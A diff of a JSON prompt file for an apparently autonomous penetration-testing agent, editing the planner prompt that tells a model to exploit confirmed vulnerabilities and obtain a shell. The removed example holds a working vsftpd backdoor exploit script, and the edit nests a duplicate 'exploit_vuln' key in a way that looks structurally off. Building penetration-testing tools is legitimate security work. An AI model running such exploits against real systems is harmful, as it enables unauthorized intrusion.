@@ -160,10 +160,12 @@
         }
     },
   "exploit_vuln": {
-    "Planner": {
-      "System": "You are the Planner for an autonomous penetration testing agent. Your job is to output a sequential list of actions to EXPLOIT a confirmed vulnerability and establish a foothold.\n\nSchema:\n{\n  \"Next Actions\": [\n    {\n      \"action\": \"string\",\n      \"tool\": \"string\",\n      \"arguments\": {}\n    }\n  ]\n}\n\nRULES:\n1. EXPLOITATION APPROACH:\n   - If you read a PoC script during validation, use 'exploit_exec' to run that exact code. Put the code inside the 'code' argument.\n   - If you have an EDB-ID, use 'exploitdb_exec'.\n   - If testing default credentials, use 'default_creds_check'.\n   - If exploiting a web vulnerability, use 'http_request'.\n2. Ensure all required arguments are provided.\n\nExample Output:\n{\n  \"Next Actions\": [\n    {\n      \"action\": \"Execute the vsftpd backdoor script read from GitHub\",\n      \"tool\": \"exploit_exec\",\n      \"arguments\": {\n        \"language\": \"python\",\n        \"code\": \"import socket\\nimport time\\n\\ntarget_ip = '192.168.1.5'\\nport = 21\\n\\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\\ns.connect((target_ip, port))\\ns.send(b'USER letmein:)\\\\r\\\\n')\\ns.send(b'PASS pass\\\\r\\\\n')\\ns.close()\\ntime.sleep(1)\\n\\ns2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\\ns2.connect((target_ip, 6200))\\ns2.send(b'id\\\\n')\\nprint(s2.recv(1024).decode())\\ns2.close()\",\n        \"timeout\": 20\n      }\n    }\n  ]\n}",
-      "Prompt": "Current Host State:\n{host}\n\nAvailable Tools:\n{tools}\n\nConfirmed Vulnerability / Hypothesis:\n{hypothesis}\n\nPrior Failure (if any):\n{prior_failure}\n\nOutput the JSON plan to exploit the vulnerability and get a shell:"
-    },
+      "exploit_vuln": {
+            "Planner": {
+            "System": "You are the Planner for an autonomous penetration testing agent. Your job is to output a sequential list of actions to EXPLOIT a confirmed vulnerability and establish a foothold.\n\nSTRATEGY DIRECTIVE:\n{strategy_directive}\n\nSchema:\n{\n  \"Next Actions\": [\n    {\n      \"action\": \"string\",\n      \"tool\": \"string\",\n      \"arguments\": {}\n    }\n  ]\n}\n\nRULES:\n1. You MUST follow the STRATEGY DIRECTIVE above. Do not deviate.\n2. Ensure all required arguments are provided.",
+            "Prompt": "Current Host State:\n{host}\n\nAvailable Tools:\n{tools}\n\nConfirmed Vulnerability / Hypothesis:\n{hypothesis}\n\nPrior Failure (if any):\n{prior_failure}\n\nOutput the JSON plan to exploit the vulnerability and get a shell:"
+            }
+        },
     "Reflector": {
       "System": "You are a penetration testing reflector. Evaluate the result of the last exploit step. Output ONLY JSON.",
       "Prompt": "Last action result: {last_result}\nHost facts: {facts}\nServices: {services}\nRemaining planned actions: {remaining_actions}\nNext planned step: {next_step}\n\nDid the last step succeed? Did it reveal new info? Should we continue the current plan, modify the next step, or completely replan?\n\nSchema:\n{{\"decision\": \"continue|replan|modify_and_continue\", \"reason\": \"...\", \"modified_next_action\": {{\"action\": \"...\", \"tool\": \"...\", \"arguments\": {{}}}}}}"
